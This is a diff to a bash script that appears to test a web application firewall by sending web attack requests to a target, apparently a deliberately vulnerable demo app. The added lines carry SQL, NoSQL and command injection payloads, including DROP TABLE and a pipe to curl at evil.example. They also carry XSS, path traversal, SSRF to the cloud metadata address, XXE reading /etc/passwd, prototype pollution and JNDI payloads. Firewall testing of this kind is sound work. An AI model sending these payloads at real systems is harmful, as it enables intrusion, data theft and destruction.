@@ -30,7 +30,7 @@ done
 req() {
   local label="$1"; shift
   local code
-  code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 20 "$@")
+  code=$(curl -sk --globoff -o /dev/null -w '%{http_code}' --max-time 20 "$@")
   printf '  %-22s %-40s -> %s\n' "$label" "${*: -1}" "$code"
 }
 
@@ -46,24 +46,57 @@ round() {
   # --- SQL injection ---
   req "sqli: or-1-1"        "$TARGET/?q=1'%20OR%20'1'='1"
   req "sqli: union-select"  "$TARGET/?id=1%20UNION%20SELECT%20username,password%20FROM%20users"
+  req "sqli: comment"       "$TARGET/?id=1;--%20"
+  req "sqli: sleep"         "$TARGET/?id=1%20AND%20SLEEP(5)"
+  req "sqli: stacked drop"  "$TARGET/?id=1;DROP%20TABLE%20users;--"
+  req "sqli: in header"     -H "X-Search: ' OR 1=1 --" "$TARGET/"
+
+  # --- NoSQL injection (Mongo operators, which Goof is actually vulnerable to) ---
+  req "nosqli: gt"          -H 'Content-Type: application/json' \
+                            -d '{"username":"admin@snyk.io","password":{"$gt":""}}' "$TARGET/login"
+  req "nosqli: ne"          "$TARGET/?username[\$ne]=x"
 
   # --- Cross-site scripting ---
   req "xss: script-tag"     "$TARGET/?s=<script>alert(1)</script>"
+  req "xss: img-onerror"    "$TARGET/?s=<img%20src=x%20onerror=alert(1)>"
+  req "xss: svg-onload"     "$TARGET/?s=<svg/onload=alert(1)>"
+  req "xss: js-uri"         "$TARGET/?url=javascript:alert(document.cookie)"
   req "xss: in form field"  -d "content=<script>alert(document.cookie)</script>" "$TARGET/create"
 
   # --- Command injection ---
   req "cmdi: cat passwd"    "$TARGET/?cmd=;cat%20/etc/passwd"
+  req "cmdi: backticks"     "$TARGET/?cmd=\`id\`"
+  req "cmdi: pipe-curl"     "$TARGET/?cmd=|curl%20http://evil.example/x"
 
   # --- Path traversal / LFI ---
   req "lfi: etc-passwd"     "$TARGET/?file=../../../../etc/passwd"
+  req "lfi: encoded"        "$TARGET/?file=..%2f..%2f..%2f..%2fetc%2fpasswd"
+  req "lfi: win-hosts"      "$TARGET/?file=..\\..\\..\\windows\\win.ini"
+
+  # --- Server-side request forgery ---
+  req "ssrf: metadata"      "$TARGET/?url=http://169.254.169.254/latest/meta-data/"
+  req "ssrf: localhost"     "$TARGET/?url=http://127.0.0.1:3001/admin"
+
+  # --- API-style JSON attacks ---
+  req "api: sqli in json"   -H 'Content-Type: application/json' \
+                            -d '{"content":"1 OR 1=1"}' "$TARGET/create"
+  req "api: xss in json"    -H 'Content-Type: application/json' \
+                            -d '{"content":"<script>alert(1)</script>"}' "$TARGET/create"
+  req "api: proto-pollute"  -H 'Content-Type: application/json' \
+                            -d '{"__proto__":{"isAdmin":true}}' "$TARGET/create"
 
   # --- Bad reputation / scanner user-agents ---
-  req "ua: sqlmap"          -A "sqlmap/1.7"   "$TARGET/"
-  req "ua: nikto"           -A "Nikto/2.5.0"  "$TARGET/"
+  req "ua: sqlmap"          -A "sqlmap/1.7"        "$TARGET/"
+  req "ua: nikto"           -A "Nikto/2.5.0"       "$TARGET/"
+  req "ua: nmap"            -A "Mozilla/5.0 (Nmap Scripting Engine)" "$TARGET/"
+  req "ua: acunetix"        -A "acunetix-wvs"      "$TARGET/"
 
-  # --- Protocol/ header oddities WAF rules flag ---
+  # --- Protocol / header oddities WAF rules flag ---
   req "hdr: null-byte path" "$TARGET/%00"
   req "hdr: log4shell-ish"  -H 'User-Agent: ${jndi:ldap://x/a}' "$TARGET/"
+  req "hdr: crlf inject"    "$TARGET/?x=1%0d%0aSet-Cookie:%20injected=1"
+  req "hdr: xxe body"       -H 'Content-Type: application/xml' \
+                            -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>' "$TARGET/create"
 }
 
 echo "Target: $TARGET   Rounds: $ROUNDS   Delay: ${DELAY}s"
